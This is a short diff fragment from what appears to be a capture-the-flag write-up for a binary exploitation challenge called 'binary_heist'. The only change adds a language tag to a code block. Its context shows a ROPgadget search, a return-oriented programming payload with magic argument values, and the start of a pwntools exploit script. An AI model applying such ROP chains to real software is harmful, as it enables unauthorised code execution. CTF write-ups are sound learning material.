@@ -77,7 +77,7 @@ $ ROPgadget --binary binary_heist | grep "pop rdi"
 ```payload = offset + p64(pop_rdi_rsi_ret) + p64(0x1337c0d31337c0d3) + p64(0xacedc0deacedc0de) + p64(0x401243)```
 
 **Exploit:**
-```
+```python
 from pwn import *
 
 def start(argv=[], *a, **kw):
